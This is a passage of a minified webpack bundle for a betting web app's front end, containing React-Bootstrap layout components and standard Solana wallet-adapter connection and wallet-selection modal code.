        var e, t = Object.getPrototypeOf ? e => Object.getPrototypeOf(e) : e => e.__proto__;
        __webpack_require__.t = function(n, r) {
            if (1 & r && (n = this(n)), 8 & r) return n;
            if ("object" === typeof n && n) {
                if (4 & r && n.__esModule) return n;
                if (16 & r && "function" === typeof n.then) return n
            }
            var i = Object.create(null);
            __webpack_require__.r(i);
            var o = {};
            e = e || [null, t({}), t([]), t(t)];
            for (var s = 2 & r && n;
                "object" == typeof s && !~e.indexOf(s); s = t(s)) Object.getOwnPropertyNames(s).forEach((e => o[e] = () => n[e]));
            return o.default = () => n, __webpack_require__.d(i, o), i
        }
    })(), __webpack_require__.d = (e, t) => {
        for (var n in t) __webpack_require__.o(t, n) && !__webpack_require__.o(e, n) && Object.defineProperty(e, n, {
            enumerable: !0,
            get: t[n]
        })
    }, __webpack_require__.f = {}, __webpack_require__.e = e => Promise.all(Object.keys(__webpack_require__.f).reduce(((t, n) => (__webpack_require__.f[n](e, t), t)), [])), __webpack_require__.u = e => "static/js/" + e + "." + {
        126: "c321e317",
        431: "ca080524",
        592: "c095c2d0",
        714: "bd7fa959",
        787: "85355cb4",
        912: "75cf16e5",
        997: "aeec8a71"
    }[e] + ".chunk.js", __webpack_require__.miniCssF = e => {}, __webpack_require__.g = function() {
        if ("object" === typeof globalThis) return globalThis;
        try {
            return this || new Function("return this")()
        } catch (e) {
            if ("object" === typeof window) return window
        }
    }(), __webpack_require__.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t), (() => {
        var e = {},
            t = "single-betting-front:";
        __webpack_require__.l = (n, r, i, o) => {
            if (e[n]) e[n].push(r);
            else {
                var s, a;
                if (void 0 !== i)
                    for (var u = document.getElementsByTagName("script"), c = 0; c < u.length; c++) {
                        var l = u[c];
                        if (l.getAttribute("src") == n || l.getAttribute("data-webpack") == t + i) {
                            s = l;
                            break
                        }
                    }
                s || (a = !0, (s = document.createElement("script")).charset = "utf-8", s.timeout = 120, __webpack_require__.nc && s.setAttribute("nonce", __webpack_require__.nc), s.setAttribute("data-webpack", t + i), s.src = n), e[n] = [r];
                var f = (t, r) => {
                        s.onerror = s.onload = null, clearTimeout(h);
                        var i = e[n];
                        if (delete e[n], s.parentNode && s.parentNode.removeChild(s), i && i.forEach((e => e(r))), t) return t(r)
                    },
                    h = setTimeout(f.bind(null, void 0, {
                        type: "timeout",
                        target: s
                    }), 12e4);
                s.onerror = f.bind(null, s.onerror), s.onload = f.bind(null, s.onload), a && document.head.appendChild(s)
            }
        }
    })(), __webpack_require__.r = e => {
        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, __webpack_require__.nmd = e => (e.paths = [], e.children || (e.children = []), e), __webpack_require__.p = "/", (() => {
        var e = {
            179: 0
        };
        __webpack_require__.f.j = (t, n) => {
            var r = __webpack_require__.o(e, t) ? e[t] : void 0;
            if (0 !== r)
                if (r) n.push(r[2]);
                else {
                    var i = new Promise(((n, i) => r = e[t] = [n, i]));
                    n.push(r[2] = i);
                    var o = __webpack_require__.p + __webpack_require__.u(t),
                        s = new Error;
                    __webpack_require__.l(o, (n => {
                        if (__webpack_require__.o(e, t) && (0 !== (r = e[t]) && (e[t] = void 0), r)) {
                            var i = n && ("load" === n.type ? "missing" : n.type),
                                o = n && n.target && n.target.src;
                            s.message = "Loading chunk " + t + " failed.\n(" + i + ": " + o + ")", s.name = "ChunkLoadError", s.type = i, s.request = o, r[1](s)
                        }
                    }), "chunk-" + t, t)
                }
        };
        var t = (t, n) => {
                var r, i, [o, s, a] = n,
                    u = 0;
                if (o.some((t => 0 !== e[t]))) {
                    for (r in s) __webpack_require__.o(s, r) && (__webpack_require__.m[r] = s[r]);
                    if (a) a(__webpack_require__)
                }
                for (t && t(n); u < o.length; u++) i = o[u], __webpack_require__.o(e, i) && e[i] && e[i][0](), e[i] = 0
            },
            n = self.webpackChunksingle_betting_front = self.webpackChunksingle_betting_front || [];
        n.forEach(t.bind(null, 0)), n.push = t.bind(null, n.push.bind(n))
    })();
    var __webpack_exports__ = {};
    (() => {
        "use strict";
        var e = __webpack_require__(2791),
            t = __webpack_require__(1250);
        const n = __webpack_require__.p + "static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg";
        var r = __webpack_require__(1694),
            i = __webpack_require__.n(r),
            o = __webpack_require__(184);
        const s = ["xxl", "xl", "lg", "md", "sm", "xs"],
            a = "xs",
            u = e.createContext({
                prefixes: {},
                breakpoints: s,
                minBreakpoint: a
            }),
            {
                Consumer: c,
                Provider: l
            } = u;

        function f(t, n) {
            const {
                prefixes: r
            } = (0, e.useContext)(u);
            return t || r[n] || n
        }

        function h() {
            const {
                breakpoints: t
            } = (0, e.useContext)(u);
            return t
        }

        function d() {
            const {
                minBreakpoint: t
            } = (0, e.useContext)(u);
            return t
        }
        const p = e.forwardRef(((e, t) => {
            let {
                bsPrefix: n,
                className: r,
                as: s = "div",
                ...a
            } = e;
            const u = f(n, "row"),
                c = h(),
                l = d(),
                p = `${u}-cols`,
                y = [];
            return c.forEach((e => {
                const t = a[e];
                let n;
                delete a[e], null != t && "object" === typeof t ? ({
                    cols: n
                } = t) : n = t;
                const r = e !== l ? `-${e}` : "";
                null != n && y.push(`${p}${r}-${n}`)
            })), (0, o.jsx)(s, {
                ref: t,
                ...a,
                className: i()(r, u, ...y)
            })
        }));
        p.displayName = "Row";
        const y = p;
        const g = e.forwardRef(((e, t) => {
            const [{
                className: n,
                ...r
            }, {
                as: s = "div",
                bsPrefix: a,
                spans: u
            }] = function(e) {
                let {
                    as: t,
                    bsPrefix: n,
                    className: r,
                    ...o
                } = e;
                n = f(n, "col");
                const s = h(),
                    a = d(),
                    u = [],
                    c = [];
                return s.forEach((e => {
                    const t = o[e];
                    let r, i, s;
                    delete o[e], "object" === typeof t && null != t ? ({
                        span: r,
                        offset: i,
                        order: s
                    } = t) : r = t;
                    const l = e !== a ? `-${e}` : "";
                    r && u.push(!0 === r ? `${n}${l}` : `${n}${l}-${r}`), null != s && c.push(`order${l}-${s}`), null != i && c.push(`offset${l}-${i}`)
                })), [{ ...o,
                    className: i()(r, ...u, ...c)
                }, {
                    as: t,
                    bsPrefix: n,
                    spans: u
                }]
            }(e);
            return (0, o.jsx)(s, { ...r,
                ref: t,
                className: i()(n, !u.length && a)
            })
        }));
        g.displayName = "Col";
        const m = g,
            w = ["as", "disabled"];

        function b(e) {
            let {
                tagName: t,
                disabled: n,
                href: r,
                target: i,
                rel: o,
                role: s,
                onClick: a,
                tabIndex: u = 0,
                type: c
            } = e;
            t || (t = null != r || null != i || null != o ? "a" : "button");
            const l = {
                tagName: t
            };
            if ("button" === t) return [{
                type: c || "button",
                disabled: n
            }, l];
            const f = e => {
                (n || "a" === t && function(e) {
                    return !e || "#" === e.trim()
                }(r)) && e.preventDefault(), n ? e.stopPropagation() : null == a || a(e)
            };
            return "a" === t && (r || (r = "#"), n && (r = void 0)), [{
                role: null != s ? s : "button",
                disabled: void 0,
                tabIndex: n ? void 0 : u,
                href: r,
                target: "a" === t ? i : void 0,
                "aria-disabled": n || void 0,
                rel: "a" === t ? o : void 0,
                onClick: f,
                onKeyDown: e => {
                    " " === e.key && (e.preventDefault(), f(e))
                }
            }, l]
        }
        const v = e.forwardRef(((e, t) => {
            let {
                as: n,
                disabled: r
            } = e, i = function(e, t) {
                if (null == e) return {};
                var n, r, i = {},
                    o = Object.keys(e);
                for (r = 0; r < o.length; r++) n = o[r], t.indexOf(n) >= 0 || (i[n] = e[n]);
                return i
            }(e, w);
            const [s, {
                tagName: a
            }] = b(Object.assign({
                tagName: n,
                disabled: r
            }, i));
            return (0, o.jsx)(a, Object.assign({}, i, s, {
                ref: t
            }))
        }));
        v.displayName = "Button";
        const A = e.forwardRef(((e, t) => {
            let {
                as: n,
                bsPrefix: r,
                variant: s,
                size: a,
                active: u,
                className: c,
                ...l
            } = e;
            const h = f(r, "btn"),
                [d, {
                    tagName: p
                }] = b({
                    tagName: n,
                    ...l
                }),
                y = p;
            return (0, o.jsx)(y, { ...d,
                ...l,
                ref: t,
                className: i()(c, h, u && "active", s && `${h}-${s}`, a && `${h}-${a}`, l.href && l.disabled && "disabled")
            })
        }));
        A.displayName = "Button", A.defaultProps = {
            variant: "primary",
            active: !1,
            disabled: !1
        };
        const k = A;
        var _ = __webpack_require__(9679);
        const E = (0, e.createContext)({});
        const S = t => {
                let {
                    children: n,
                    endpoint: r,
                    config: i = {
                        commitment: "confirmed"
                    }
                } = t;
                const o = (0, e.useMemo)((() => new _.Connection(r, i)), [r, i]);
                return e.createElement(E.Provider, {
                    value: {
                        connection: o
                    }
                }, n)
            },
            I = [],
            x = {
                autoConnect: !1,
                connecting: !1,
                connected: !1,
                disconnecting: !1,
                select(e) {
                    console.error(M("get", "select"))
                },
                connect: () => Promise.reject(console.error(M("get", "connect"))),
                disconnect: () => Promise.reject(console.error(M("get", "disconnect"))),
                sendTransaction: (e, t, n) => Promise.reject(console.error(M("get", "sendTransaction"))),
                signTransaction: e => Promise.reject(console.error(M("get", "signTransaction"))),
                signAllTransactions: e => Promise.reject(console.error(M("get", "signAllTransactions"))),
                signMessage: e => Promise.reject(console.error(M("get", "signMessage")))
            };

        function M(e, t) {
            return `You have tried to  ${e} "${t}" on a WalletContext without providing one. Make sure to render a WalletProvider as an ancestor of the component that uses WalletContext`
        }
        Object.defineProperty(x, "wallets", {
            get: () => (console.error(M("read", "wallets")), I)
        }), Object.defineProperty(x, "wallet", {
            get: () => (console.error(M("read", "wallet")), null)
        }), Object.defineProperty(x, "publicKey", {
            get: () => (console.error(M("read", "publicKey")), null)
        });
        const B = (0, e.createContext)(x);

        function T() {
            return (0, e.useContext)(B)
        }
        var O, C = __webpack_require__(7143),
            P = __webpack_require__.n(C);
        class L extends Error {
            constructor(e, t) {
                super(e), this.error = t
            }
        }
        class N extends L {
            constructor() {
                super(...arguments), this.name = "WalletNotReadyError"
            }
        }
        class R extends L {
            constructor() {
                super(...arguments), this.name = "WalletLoadError"
            }
        }
        class D extends L {
            constructor() {
                super(...arguments), this.name = "WalletConfigError"
            }
        }
        class z extends L {
            constructor() {
                super(...arguments), this.name = "WalletConnectionError"
            }
        }
        class U extends L {
            constructor() {
                super(...arguments), this.name = "WalletDisconnectedError"
            }
        }
        class j extends L {
            constructor() {
                super(...arguments), this.name = "WalletDisconnectionError"
            }
        }
        class F extends L {
            constructor() {
                super(...arguments), this.name = "WalletAccountError"
            }
        }
        class H extends L {
            constructor() {
                super(...arguments), this.name = "WalletPublicKeyError"
            }
        }
        class W extends L {
            constructor() {
                super(...arguments), this.name = "WalletNotConnectedError"
            }
        }
        class K extends L {
            constructor() {
                super(...arguments), this.name = "WalletSendTransactionError"
            }
        }
        class q extends L {
            constructor() {
                super(...arguments), this.name = "WalletSignMessageError"
            }
        }
        class V extends L {
            constructor() {
                super(...arguments), this.name = "WalletSignTransactionError"
            }
        }
        class Q extends L {
            constructor() {
                super(...arguments), this.name = "WalletTimeoutError"
            }
        }
        class G extends L {
            constructor() {
                super(...arguments), this.name = "WalletWindowBlockedError"
            }
        }
        class Y extends L {
            constructor() {
                super(...arguments), this.name = "WalletWindowClosedError"
            }
        }! function(e) {
            e.Installed = "Installed", e.NotDetected = "NotDetected", e.Loadable = "Loadable", e.Unsupported = "Unsupported"
        }(O || (O = {}));
        class Z extends C {
            get connected() {
                return !!this.publicKey
            }
            async prepareTransaction(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                const r = this.publicKey;
                if (!r) throw new W;
                return e.feePayer = e.feePayer || r, e.recentBlockhash = e.recentBlockhash || (await t.getLatestBlockhash({
                    commitment: n.preflightCommitment,
                    minContextSlot: n.minContextSlot
                })).blockhash, e
            }
        }

        function J(e) {
            if ("undefined" === typeof window || "undefined" === typeof document) return;
            const t = [];

            function n() {
                if (e())
                    for (const e of t) e()
            }
            const r = setInterval(n, 1e3);
            t.push((() => clearInterval(r))), "loading" === document.readyState && (document.addEventListener("DOMContentLoaded", n, {
                once: !0
            }), t.push((() => document.removeEventListener("DOMContentLoaded", n)))), "complete" !== document.readyState && (window.addEventListener("load", n, {
                once: !0
            }), t.push((() => window.removeEventListener("load", n)))), n()
        }
        class X extends L {
            constructor() {
                super(...arguments), this.name = "WalletNotSelectedError"
            }
        }
        const $ = {
                wallet: null,
                adapter: null,
                publicKey: null,
                connected: !1
            },
            ee = t => {
                let {
                    children: n,
                    wallets: r,
                    autoConnect: i = !1,
                    onError: o,
                    localStorageKey: s = "walletName"
                } = t;
                const [a, u] = function(t, n) {
                    const r = (0, e.useState)((() => {
                            try {
                                const e = localStorage.getItem(t);
                                if (e) return JSON.parse(e)
                            } catch (e) {
                                "undefined" !== typeof window && console.error(e)
                            }
                            return n
                        })),
                        i = r[0],
                        o = (0, e.useRef)(!0);
                    return (0, e.useEffect)((() => {
                        if (o.current) o.current = !1;
                        else try {
                            null === i ? localStorage.removeItem(t) : localStorage.setItem(t, JSON.stringify(i))
                        } catch (e) {
                            "undefined" !== typeof window && console.error(e)
                        }
                    }), [i]), r
                }(s, null), [{
                    wallet: c,
                    adapter: l,
                    publicKey: f,
                    connected: h
                }, d] = (0, e.useState)($), p = (null === l || void 0 === l ? void 0 : l.readyState) || O.Unsupported, [y, g] = (0, e.useState)(!1), [m, w] = (0, e.useState)(!1), b = (0, e.useRef)(!1), v = (0, e.useRef)(!1), A = (0, e.useRef)(!1), [k, _] = (0, e.useState)((() => r.map((e => ({
                    adapter: e,
                    readyState: e.readyState
                })))));
                (0, e.useEffect)((() => {
                    function e(e) {
                        _((t => {
                            const n = t.findIndex((e => {
                                let {
                                    adapter: t
                                } = e;
                                return t.name === this.name
                            }));
                            return -1 === n ? t : [...t.slice(0, n), { ...t[n],
                                readyState: e
                            }, ...t.slice(n + 1)]
                        }))
                    }
                    for (const t of r) t.on("readyStateChange", e, t);
                    return () => {
                        for (const t of r) t.off("readyStateChange", e, t)
                    }
                }), [r]), (0, e.useEffect)((() => {
                    const e = k.find((e => {
                        let {
                            adapter: t
                        } = e;
                        return t.name === a
                    }));
                    d(e ? {
                        wallet: e,
                        adapter: e.adapter,
                        connected: e.adapter.connected,
                        publicKey: e.adapter.publicKey
                    } : $)
                }), [a, k]), (0, e.useEffect)((() => {
                    b.current || y || h || !i || !l || p !== O.Installed && p !== O.Loadable || async function() {
                        b.current = !0, g(!0);
                        try {
                            await l.connect()
                        } catch (e) {
                            u(null)
                        } finally {
                            g(!1), b.current = !1
                        }
                    }()
                }), [b, y, h, i, l, p]), (0, e.useEffect)((() => {
                    function e() {
                        A.current = !0
                    }
                    return window.addEventListener("beforeunload", e), () => window.removeEventListener("beforeunload", e)
                }), [A]);
                const E = (0, e.useCallback)((() => {
                        l && d((e => ({ ...e,
                            connected: l.connected,
                            publicKey: l.publicKey
                        })))
                    }), [l]),
                    S = (0, e.useCallback)((() => {
                        A.current || u(null)
                    }), [A]),
                    I = (0, e.useCallback)((e => (A.current || (o || console.error)(e), e)), [A, o]);
                (0, e.useEffect)((() => {
                    if (l) return l.on("connect", E), l.on("disconnect", S), l.on("error", I), () => {
                        l.off("connect", E), l.off("disconnect", S), l.off("error", I)
                    }
                }), [l, E, S, I]), (0, e.useEffect)((() => () => {
                    null === l || void 0 === l || l.disconnect()
                }), [l]);
                const x = (0, e.useCallback)((async () => {
                        if (!(b.current || y || m || h)) {
                            if (!l) throw I(new X);
                            if (p !== O.Installed && p !== O.Loadable) throw u(null), "undefined" !== typeof window && window.open(l.url, "_blank"), I(new N);
                            b.current = !0, g(!0);
                            try {
                                await l.connect()
                            } catch (e) {
                                throw u(null), e
                            } finally {
                                g(!1), b.current = !1
                            }
                        }
                    }), [b, y, m, h, l, p, I]),
                    M = (0, e.useCallback)((async () => {
                        if (!v.current && !m) {
                            if (!l) return u(null);
                            v.current = !0, w(!0);
                            try {
                                await l.disconnect()
                            } catch (e) {
                                throw u(null), e
                            } finally {
                                w(!1), v.current = !1
                            }
                        }
                    }), [v, m, l]),
                    T = (0, e.useCallback)((async (e, t, n) => {
                        if (!l) throw I(new X);
                        if (!h) throw I(new W);
                        return await l.sendTransaction(e, t, n)
                    }), [l, I, h]),
                    C = (0, e.useMemo)((() => l && "signTransaction" in l ? async e => {
                        if (!h) throw I(new W);
                        return await l.signTransaction(e)
                    } : void 0), [l, I, h]),
                    P = (0, e.useMemo)((() => l && "signAllTransactions" in l ? async e => {
                        if (!h) throw I(new W);
                        return await l.signAllTransactions(e)
                    } : void 0), [l, I, h]),
                    L = (0, e.useMemo)((() => l && "signMessage" in l ? async e => {
                        if (!h) throw I(new W);
                        return await l.signMessage(e)
                    } : void 0), [l, I, h]);
                return e.createElement(B.Provider, {
                    value: {
                        autoConnect: i,
                        wallets: k,
                        wallet: c,
                        publicKey: f,
                        connected: h,
                        connecting: y,
                        disconnecting: m,
                        select: u,
                        connect: x,
                        disconnect: M,
                        sendTransaction: T,
                        signTransaction: C,
                        signAllTransactions: P,
                        signMessage: L
                    }
                }, n)
            },
            te = {
                setVisible(e) {
                    console.error(ne("call", "setVisible"))
                },
                visible: !1
            };

        function ne(e, t) {
            return `You have tried to  ${e} "${t}" on a WalletModalContext without providing one. Make sure to render a WalletModalProvider as an ancestor of the component that uses WalletModalContext`
        }
        Object.defineProperty(te, "visible", {
            get: () => (console.error(ne("read", "visible")), !1)
        });
        const re = (0, e.createContext)(te);

        function ie() {
            return (0, e.useContext)(re)
        }
        const oe = t => e.createElement("button", {
                className: `wallet-adapter-button ${t.className||""}`,
                disabled: t.disabled,
                onClick: t.onClick,
                tabIndex: t.tabIndex || 0,
                type: "button"
            }, t.startIcon && e.createElement("i", {
                className: "wallet-adapter-button-start-icon"
            }, t.startIcon), t.children, t.endIcon && e.createElement("i", {
                className: "wallet-adapter-button-end-icon"
            }, t.endIcon)),
            se = t => {
                let {
                    wallet: n,
                    ...r
                } = t;
                return n && e.createElement("img", {
                    src: n.adapter.icon,
                    alt: `${n.adapter.name} icon`,
                    ...r
                })
            },
            ae = t => {
                let {
                    children: n,
                    disabled: r,
                    onClick: i,
                    ...o
                } = t;
                const {
                    wallet: s,
                    connect: a,
                    connecting: u,
                    connected: c
                } = T(), l = (0, e.useCallback)((e => {
                    i && i(e), e.defaultPrevented || a().catch((() => {}))
                }), [i, a]), f = (0, e.useMemo)((() => n || (u ? "Connecting ..." : c ? "Connected" : s ? "Connect" : "Connect Wallet")), [n, u, c, s]);
                return e.createElement(oe, {
                    className: "wallet-adapter-button-trigger",
                    disabled: r || !s || u || c,
                    startIcon: s ? e.createElement(se, {
                        wallet: s
                    }) : void 0,
                    onClick: l,
                    ...o
                }, f)
            };
        var ue = __webpack_require__(4164);
        const ce = t => {
                let {
                    id: n,
                    children: r,
                    expanded: i = !1
                } = t;
                const o = (0, e.useRef)(null),
                    s = (0, e.useRef)(!0);
                return (0, e.useLayoutEffect)((() => {
                    i ? (() => {
                        const e = o.current;
                        e && requestAnimationFrame((() => {
                            e.style.height = e.scrollHeight + "px"
                        }))
                    })() : (() => {
                        const e = o.current;
                        e && requestAnimationFrame((() => {
                            e.style.height = e.offsetHeight + "px", e.style.overflow = "hidden", requestAnimationFrame((() => {
                                e.style.height = "0"
                            }))
                        }))
                    })()
                }), [i]), (0, e.useLayoutEffect)((() => {
                    const e = o.current;
                    if (e) return s.current && (t(), s.current = !1), e.addEventListener("transitionend", n), () => e.removeEventListener("transitionend", n);

                    function t() {
                        e && (e.style.overflow = i ? "initial" : "hidden", i && (e.style.height = "auto"))
                    }

                    function n(n) {
                        e && n.target === e && "height" === n.propertyName && t()
                    }
                }), [i]), e.createElement("div", {
                    children: r,
                    className: "wallet-adapter-collapse",
                    id: n,
                    ref: o,
                    role: "region",
                    style: {
                        height: 0,
                        transition: s.current ? void 0 : "height 250ms ease-out"
                    }
                })
            },
            le = t => {
                let {
                    handleClick: n,
                    tabIndex: r,
                    wallet: i
                } = t;
                return e.createElement("li", null, e.createElement(oe, {
                    onClick: n,
                    startIcon: e.createElement(se, {
                        wallet: i
                    }),
                    tabIndex: r
                }, i.adapter.name, i.readyState === O.Installed && e.createElement("span", null, "Detected")))
            },
            fe = () => e.createElement("svg", {
                width: "97",
                height: "96",
                viewBox: "0 0 97 96",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg"
            }, e.createElement("circle", {
                cx: "48.5",
                cy: "48",
                r: "48",
                fill: "url(#paint0_linear_880_5115)",
                fillOpacity: "0.1"
            }), e.createElement("circle", {
                cx: "48.5",
                cy: "48",
                r: "47",
                stroke: "url(#paint1_linear_880_5115)",
                strokeOpacity: "0.4",
                strokeWidth: "2"
            }), e.createElement("g", {
                clipPath: "url(#clip0_880_5115)"
            }, e.createElement("path", {
                d: "M65.5769 28.1523H31.4231C27.6057 28.1523 24.5 31.258 24.5 35.0754V60.9215C24.5 64.7389 27.6057 67.8446 31.4231 67.8446H65.5769C69.3943 67.8446 72.5 64.7389 72.5 60.9215V35.0754C72.5 31.258 69.3943 28.1523 65.5769 28.1523ZM69.7308 52.1523H59.5769C57.2865 52.1523 55.4231 50.289 55.4231 47.9985C55.4231 45.708 57.2864 43.8446 59.5769 43.8446H69.7308V52.1523ZM69.7308 41.0754H59.5769C55.7595 41.0754 52.6539 44.1811 52.6539 47.9985C52.6539 51.8159 55.7595 54.9215 59.5769 54.9215H69.7308V60.9215C69.7308 63.2119 67.8674 65.0754 65.5769 65.0754H31.4231C29.1327 65.0754 27.2692 63.212 27.2692 60.9215V35.0754C27.2692 32.785 29.1326 30.9215 31.4231 30.9215H65.5769C67.8673 30.9215 69.7308 32.7849 69.7308 35.0754V41.0754Z",
                fill: "url(#paint2_linear_880_5115)"
            }), e.createElement("path", {
                d: "M61.4231 46.6172H59.577C58.8123 46.6172 58.1924 47.2371 58.1924 48.0018C58.1924 48.7665 58.8123 49.3863 59.577 49.3863H61.4231C62.1878 49.3863 62.8077 48.7664 62.8077 48.0018C62.8077 47.2371 62.1878 46.6172 61.4231 46.6172Z",
                fill: "url(#paint3_linear_880_5115)"
            })), e.createElement("defs", null, e.createElement("linearGradient", {
                id: "paint0_linear_880_5115",
                x1: "3.41664",
                y1: "98.0933",
                x2: "103.05",
                y2: "8.42498",
                gradientUnits: "userSpaceOnUse"
            }, e.createElement("stop", {
                stopColor: "#9945FF"
            }), e.createElement("stop", {
                offset: "0.14",
                stopColor: "#8A53F4"
            }), e.createElement("stop", {
                offset: "0.42",
                stopColor: "#6377D6"
            }), e.createElement("stop", {
                offset: "0.79",
                stopColor: "#24B0A7"
            }), e.createElement("stop", {
                offset: "0.99",
                stopColor: "#00D18C"
            }), e.createElement("stop", {
                offset: "1",
                stopColor: "#00D18C"
            })), e.createElement("linearGradient", {
                id: "paint1_linear_880_5115",
                x1: "3.41664",
                y1: "98.0933",
                x2: "103.05",
                y2: "8.42498",
                gradientUnits: "userSpaceOnUse"
            }, e.createElement("stop", {
                stopColor: "#9945FF"
            }), e.createElement("stop", {
                offset: "0.14",
                stopColor: "#8A53F4"
            }), e.createElement("stop", {
                offset: "0.42",
                stopColor: "#6377D6"
            }), e.createElement("stop", {
                offset: "0.79",
                stopColor: "#24B0A7"
            }), e.createElement("stop", {
                offset: "0.99",
                stopColor: "#00D18C"
            }), e.createElement("stop", {
                offset: "1",
                stopColor: "#00D18C"
            })), e.createElement("linearGradient", {
                id: "paint2_linear_880_5115",
                x1: "25.9583",
                y1: "68.7101",
                x2: "67.2337",
                y2: "23.7879",
                gradientUnits: "userSpaceOnUse"
            }, e.createElement("stop", {
                stopColor: "#9945FF"
            }), e.createElement("stop", {
                offset: "0.14",
                stopColor: "#8A53F4"
            }), e.createElement("stop", {
                offset: "0.42",
                stopColor: "#6377D6"
            }), e.createElement("stop", {
                offset: "0.79",
                stopColor: "#24B0A7"
            }), e.createElement("stop", {
                offset: "0.99",
                stopColor: "#00D18C"
            }), e.createElement("stop", {
                offset: "1",
                stopColor: "#00D18C"
            })), e.createElement("linearGradient", {
                id: "paint3_linear_880_5115",
                x1: "58.3326",
                y1: "49.4467",
                x2: "61.0002",
                y2: "45.4453",
                gradientUnits: "userSpaceOnUse"
            }, e.createElement("stop", {
                stopColor: "#9945FF"
            }), e.createElement("stop", {
                offset: "0.14",
                stopColor: "#8A53F4"
            }), e.createElement("stop", {
                offset: "0.42",
                stopColor: "#6377D6"
            }), e.createElement("stop", {
                offset: "0.79",
                stopColor: "#24B0A7"
            }), e.createElement("stop", {
                offset: "0.99",
                stopColor: "#00D18C"
            }), e.createElement("stop", {
                offset: "1",
                stopColor: "#00D18C"
            })), e.createElement("clipPath", {
                id: "clip0_880_5115"
            }, e.createElement("rect", {
                width: "48",
                height: "48",
                fill: "white",
                transform: "translate(24.5 24)"
            })))),
            he = t => {
                let {
                    className: n = "",
                    container: r = "body"
                } = t;
                const i = (0, e.useRef)(null),
                    {
                        wallets: o,
                        select: s
                    } = T(),
                    {
                        setVisible: a
                    } = ie(),
                    [u, c] = (0, e.useState)(!1),
                    [l, f] = (0, e.useState)(!1),
                    [h, d] = (0, e.useState)(null),
                    [p, y] = (0, e.useMemo)((() => {
                        const e = [],
                            t = [],
                            n = [];
                        for (const r of o) r.readyState === O.NotDetected ? t.push(r) : r.readyState === O.Loadable ? n.push(r) : r.readyState === O.Installed && e.push(r);
                        return [e, [...n, ...t]]
                    }), [o]),
                    g = (0, e.useMemo)((() => p.length ? p[0] : o.find((e => "Torus" === e.adapter.name)) || o.find((e => "Phantom" === e.adapter.name)) || o.find((e => e.readyState === O.Loadable)) || y[0]), [p, o, y]),
                    m = (0, e.useCallback)((() => {
                        f(!1), setTimeout((() => a(!1)), 150)
                    }), []),
                    w = (0, e.useCallback)((e => {
                        e.preventDefault(), m()
                    }), [m]),
                    b = (0, e.useCallback)(((e, t) => {
                        s(t), w(e)
                    }), [s, w]),
                    v = (0, e.useCallback)((() => c(!u)), [u]),
                    A = (0, e.useCallback)((e => {
                        const t = i.current;
                        if (!t) return;
                        const n = t.querySelectorAll("button"),
                            r = n[0],
                            o = n[n.length - 1];
                        e.shiftKey ? document.activeElement === r && (o.focus(), e.preventDefault()) : document.activeElement === o && (r.focus(), e.preventDefault())
                    }), [i]);
                return (0, e.useLayoutEffect)((() => {
                    const e = e => {
                            "Escape" === e.key ? m() : "Tab" === e.key && A(e)
                        },
                        {
                            overflow: t
                        } = window.getComputedStyle(document.body);
                    return setTimeout((() => f(!0)), 0), document.body.style.overflow = "hidden", window.addEventListener("keydown", e, !1), () => {
                        document.body.style.overflow = t, window.removeEventListener("keydown", e, !1)
                    }
                }), [m, A]), (0, e.useLayoutEffect)((() => d(document.querySelector(r))), [r]), h && (0, ue.createPortal)(e.createElement("div", {
                    "aria-labelledby": "wallet-adapter-modal-title",
                    "aria-modal": "true",
                    className: `wallet-adapter-modal ${l&&"wallet-adapter-modal-fade-in"} ${n}`,
                    ref: i,
                    role: "dialog"
                }, e.createElement("div", {
                    className: "wallet-adapter-modal-container"
                }, e.createElement("div", {
                    className: "wallet-adapter-modal-wrapper"
                }, e.createElement("button", {
                    onClick: w,
                    className: "wallet-adapter-modal-button-close"
                }, e.createElement("svg", {
                    width: "14",
                    height: "14"
                }, e.createElement("path", {
                    d: "M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"
                }))), p.length ? e.createElement(e.Fragment, null, e.createElement("h1", {
                    className: "wallet-adapter-modal-title"
                }, "Connect a wallet on Solana to continue"), e.createElement("ul", {
                    className: "wallet-adapter-modal-list"
                }, p.map((t => e.createElement(le, {
                    key: t.adapter.name,
                    handleClick: e => b(e, t.adapter.name),
                    wallet: t
                }))), y.length ? e.createElement(ce, {
                    expanded: u,
                    id: "wallet-adapter-modal-collapse"
                }, y.map((t => e.createElement(le, {
                    key: t.adapter.name,
                    handleClick: e => b(e, t.adapter.name),
                    tabIndex: u ? 0 : -1,
                    wallet: t
                })))) : null), y.length ? e.createElement("button", {
                    className: "wallet-adapter-modal-list-more",
                    onClick: v,
                    tabIndex: 0
                }, e.createElement("span", null, u ? "Less " : "More ", "options"), e.createElement("svg", {
                    width: "13",
                    height: "7",
                    viewBox: "0 0 13 7",
                    xmlns: "http://www.w3.org/2000/svg",
                    className: "" + (u ? "wallet-adapter-modal-list-more-icon-rotate" : "")
                }, e.createElement("path", {
                    d: "M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"
                }))) : null) : e.createElement(e.Fragment, null, e.createElement("h1", {
                    className: "wallet-adapter-modal-title"
                }, "You'll need a wallet on Solana to continue"), e.createElement("div", {
                    className: "wallet-adapter-modal-middle"
                }, e.createElement(fe, null), e.createElement("button", {
                    type: "button",
                    className: "wallet-adapter-modal-middle-button",
                    onClick: e => b(e, g.adapter.name)
                }, "Get started")), y.length ? e.createElement(e.Fragment, null, e.createElement("button", {
                    className: "wallet-adapter-modal-list-more",
                    onClick: v,
                    tabIndex: 0
                }, e.createElement("span", null, u ? "Hide " : "Already have a wallet? View ", "options"), e.createElement("svg", {
                    width: "13",
                    height: "7",
                    viewBox: "0 0 13 7",
                    xmlns: "http://www.w3.org/2000/svg",
                    className: "" + (u ? "wallet-adapter-modal-list-more-icon-rotate" : "")
